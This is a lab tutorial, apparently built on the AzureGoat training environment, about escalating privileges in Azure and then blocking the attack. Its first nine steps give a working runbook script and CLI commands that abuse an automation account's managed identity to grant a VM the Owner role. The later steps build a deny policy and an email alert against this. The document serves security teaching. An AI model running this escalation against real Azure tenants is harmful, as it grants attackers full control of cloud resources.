# Securing Azure Environment from Privilege Escalation through Policies and Alerts
Privilege escalation refers to a situation where an attacker or malicious user gains access to more resources or higher levels of privileges than they are supposed to have. This can happen in a number of ways, such as exploiting a vulnerability in a system or application, stealing or guessing a user's credentials, or using social engineering techniques.

Azure Policy helps to enforce organizational standards and to assess compliance at scale. Through its compliance dashboard, it provides an aggregated view to evaluate the overall state of the environment, with the ability to drill down to the per-resource, per-policy granularity. It also helps bring your resources to compliance through bulk remediation for existing resources and automatic remediation for new ones.

Common use cases for Azure Policy include implementing governance for resource consistency, regulatory compliance, security, cost, and management. Policy definitions for these common use cases are already available in your Azure environment as built-ins to help you get started.

Azure Policy evaluates resources and actions in Azure by comparing the properties of those resources to rules. These rules, described in JSON format, are known as policy definitions. Several rules can be grouped together to simplify management to form a policy initiative (sometimes called a policySet). Once your rules have been created, the policy definition or initiative is assigned to any scope of resources Azure supports, such as management groups, subscriptions, resource groups, or individual resources. The assignment applies to all resources within the Resource Manager scope of that assignment. Subscopes can be excluded if necessary.

Alerts help you detect and address issues before users notice them by proactively notifying you when Azure Monitor data indicates that there may be a problem with your infrastructure or application. You can alert on any metric or log data source in the Azure Monitor data platform.

# Solutions

**Step 1:** Provide written permission to justin.pem file and login to the virtual machine.

**Note:** From Step 1 to Step 9 we are showing the exploitation.

```
chmod 600 justin.pem
ssh -i justin.pem justin@20.124.119.94
```

![](images/4_defending_privilege_escalations/58.png)

**Step 2:** Login with Identity.

![](images/4_defending_privilege_escalations/13.png)

**Step 3:** List all the resources.
```
az resource list
```

![](images/4_defending_privilege_escalations/14.png)

Copy the generated output into a text editor.

![](images/4_defending_privilege_escalations/15.png)

**Step 4:** Now list all the role assignments
```
az role assignment list -g azuregoat_app
```

![](images/4_defending_privilege_escalations/16.png)

![](images/4_defending_privilege_escalations/17.png)

We have the Owner and the Contributor roles. Check which resource has which roles. We will match these principal Ids with the principal ids of the step 3 output.

**Step 5:** Principal Id of Owner role is matched with *dev-automation-account*.

![](images/4_defending_privilege_escalations/18.png)

The principal Id of the Contributor role is matched with *developer VM*.

![](images/4_defending_privilege_escalations/19.png)

**Step 6:** Copy the Client Id of dev-automation-account.

![](images/4_defending_privilege_escalations/21.png)

Copy the principal Id of the VM.

![](images/4_defending_privilege_escalations/22.png)

**Step 7:** Let's create an *exploit.ps1* file.
```
nano exploit.ps1
```

![](images/4_defending_privilege_escalations/20.png)

Paste the given script inside the exploit.ps1 file.
```
workflow Get-AzureVM
{
    Disable-AzContextAutosave -Scope Process
    $AzureContext = (Connect-Azaccount -Identity -AccountId <Client Id of dev-automation-account>).context
    $AzureContext = Set-AzContext -SubscriptionName $AzureContext.Subscription -DefaultProfile $AzureContext
    New-AzRoleAssignment -RoleDefinitionName "Owner" -ObjectId <Principal Id of VM> -resourceGroupName azuregoat_app
}
```

![](images/4_defending_privilege_escalations/23.png)

**Step 8:** Now, run the below commands to escalate the VM to the Owner.
```
az automation runbook replace-content --automation-account-name "dev-automation-account-" --resource-group <ResourceGroup Name> --name "Get-AzureVM" --content @exploit.ps1
az automation runbook publish --automation-account-name "dev-automation-account-" --resource-group <ResourceGroup Name> --name "Get-AzureVM"
az automation runbook start --automation-account-name "dev-automation-account-" --resource-group <ResourceGroup Name> --name "Get-AzureVM"
```

![](images/4_defending_privilege_escalations/24.png)

Now you will see the following output.

![](images/4_defending_privilege_escalations/25.png)

**Step 9:** Run the below command:
```
az role assignment list -g azuregoat_app
```

![](images/4_defending_privilege_escalations/57.png)

We got the Owner access. Now, we will see how to prevent privilege escalation with the help of policies.

**Note:** It takes more than 10+ minutes. Even after 10 minutes, if you see no escalation, then re-run the commands in Step 8 and wait for 5+ minutes.

**Step 10:** Open the Azure Portal, log in as admin and remove the assigned Owner role from the VM.

Goto azuregoat_app resource group and click on Access control(IAM).

**Note:** Securing Azure environment begins.

![](images/4_defending_privilege_escalations/59.png)

Select the developer VM from the Owner section and Click on remove, as shown in the image.

![](images/4_defending_privilege_escalations/60.png)

**Step 11:** Go back to VM and check that our VM has no Owner role.
```
az role assignment list -g azuregoat_app
```

![](images/4_defending_privilege_escalations/61.png)

**Step 12:** Come back to the portal and search for Policy in the Search field.

![](images/4_defending_privilege_escalations/1.png)

**Step 13:** Click on Definitions and click on *+ Policy definition*.

![](images/4_defending_privilege_escalations/2.png)

**Step 14:** Definition location: *Your Subscription*.

Name: *Owner Deny policy*.

![](images/4_defending_privilege_escalations/3.png)

Use the below-given Policy:
```
{
  "mode": "All",
  "policyRule": {
    "if": {
      "allOf": [
        {
          "field": "type",
          "equals": "Microsoft.Authorization/roleAssignments"
        },
        {
          "field": "Microsoft.Authorization/roleAssignments/roleDefinitionId",
          "contains": "8e3af657-a8ff-443c-a75c-2fe8c4bcb635"
        }
      ]
    },
    "then": {
      "effect": "deny"
    }
  },
  "parameters": {}
}
```

![](images/4_defending_privilege_escalations/4.png)

Click on the Save button.

![](images/4_defending_privilege_escalations/5.png)

We finished writing our Policy. The above Policy will check if a role assignment is an Owner, then it will deny. In the IF condition, if allOf is true, then the IF condition is true, and it will execute THEN, then has the effect of deny. So, the assignment will fail.

The role Definition Id for the Owner is "8e3af657-a8ff-443c-a75c-2fe8c4bcb635". You can check the roleDefinitionIds from the doc: https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles


**Step 15:** Click on Assign so that we can assign the Policy to a specific scope then the evaluation starts to take place.

![](images/4_defending_privilege_escalations/6.png)

**Step 16:** Choose the Scope to *Resource group*.

![](images/4_defending_privilege_escalations/7.png)

**Step 17:** Click on *Review + Create*.

![](images/4_defending_privilege_escalations/8.png)

**Step 18:** Click on Create.

![](images/4_defending_privilege_escalations/9.png)

**Step 19:** Click on *Compliance* from Policy blade and choose scope to azuregoat_app resource group.

![](images/4_defending_privilege_escalations/10.png)

**Step 20:** Choose:

Scope: YOUR_SUBSCRIPTION/azuregoat_app

Compliance state: Non-compliant

And you will see our Policy also appears, which means one of our resources (automation run books) has owner access.

![](images/4_defending_privilege_escalations/11.png)

**Step 21:** If you open it, you will see the following:

You can see the scope, resource type and Details.

![](images/4_defending_privilege_escalations/12.png)

**Step 22:** Once again, return to the VM and run those three automation commands from step 8.
```
az automation runbook replace-content --automation-account-name "dev-automation-account-" --resource-group <ResourceGroup Name> --name "Get-AzureVM" --content @exploit.ps1
az automation runbook publish --automation-account-name "dev-automation-account-" --resource-group <ResourceGroup Name> --name "Get-AzureVM"
az automation runbook start --automation-account-name "dev-automation-account-" --resource-group <ResourceGroup Name> --name "Get-AzureVM"
```

![](images/4_defending_privilege_escalations/62.png)

It is started; this time, we will also check the Monitor.

![](images/4_defending_privilege_escalations/63.png)

**Step 23:** Open the Azure portal and search for Monitor.

![](images/4_defending_privilege_escalations/26.png)

**Step 24:** Click on *Activity Log* and you will see automation is started.

![](images/4_defending_privilege_escalations/27.png)

After, sometime we see the role assignment is failed. Action Deny was applied to it.

![](images/4_defending_privilege_escalations/28.png)

**Step 25:** Go back to VM, run the role list command, and check the list.
```
az role assignment list -g <RG>
```

![](images/4_defending_privilege_escalations/29.png)

You will notice that Privilege escalation is failed.

This time will see how to create Alerts as well.

**Step 26:** Go back to the portal, click on Alerts, and then click on *Alerts Rules*.

![](images/4_defending_privilege_escalations/30.png)

**Step 27:** Click on *+ Create*.

![](images/4_defending_privilege_escalations/31.png)

**Step 28:** Click on *+ Select Scope*.

![](images/4_defending_privilege_escalations/32.png)

**Step 29:** Choose ALL on filter type and choose *azuregoat_app* resource group.

![](images/4_defending_privilege_escalations/33.png)

**Step 30:** Click on *Condition*.

![](images/4_defending_privilege_escalations/34.png)

Click on *Add condition*,

Monitor service: *Activity Log - Policy*,

Signal name: *deny*.

![](images/4_defending_privilege_escalations/35.png)

**Step 31:** Go to the Actions tab.

![](images/4_defending_privilege_escalations/36.png)

Let's Create an Action group.

![](images/4_defending_privilege_escalations/37.png)

In the Basic tab, fill the following and go to the Notification tab.

![](images/4_defending_privilege_escalations/38.png)

In the Notification tab:

Notification type: Email/SMS message,

Check *Email* and give your email id.

*Yes* for the common alert schema.

![](images/4_defending_privilege_escalations/39.png)

Once done, click on *Review + Create*.

![](images/4_defending_privilege_escalations/40.png)

Click on the *Create* button.

![](images/4_defending_privilege_escalations/41.png)

**Step 32:** Click on *Details* tab.

![](images/4_defending_privilege_escalations/42.png)

Fill in the following and click *Review + Create*.

![](images/4_defending_privilege_escalations/43.png)

Click on the *Create* button.

![](images/4_defending_privilege_escalations/44.png)

**Step 33:** Open the Alert rules; after 2-3 minutes, you will see the created rules have been added.

![](images/4_defending_privilege_escalations/46.png)

Once the rules are added immediately, you will receive the following mail.

![](images/4_defending_privilege_escalations/45.png)

That's it; we successfully integrated our Alerts with our email id. If a hacker tries to escalate, the Policy will deny their query and notify us.

**Step 34:** Once again, run those automation commands.
```
az automation runbook replace-content --automation-account-name "dev-automation-account-" --resource-group <ResourceGroup Name> --name "Get-AzureVM" --content @exploit.ps1
az automation runbook publish --automation-account-name "dev-automation-account-" --resource-group <ResourceGroup Name> --name "Get-AzureVM"
az automation runbook start --automation-account-name "dev-automation-account-" --resource-group <ResourceGroup Name> --name "Get-AzureVM"
```

![](images/4_defending_privilege_escalations/47.png)

![](images/4_defending_privilege_escalations/48.png)

You can see logs from the Monitor, it is started.

![](images/4_defending_privilege_escalations/49.png)

The deny Policy has applied to it.

![](images/4_defending_privilege_escalations/50.png)

**Step 35:** Check the mail.

![](images/4_defending_privilege_escalations/51.png)

You received an email as well from Deny policy signal.

![](images/4_defending_privilege_escalations/52.png)

We have secured our Azure Environment from Privilege Escalation through Policies and Alerts.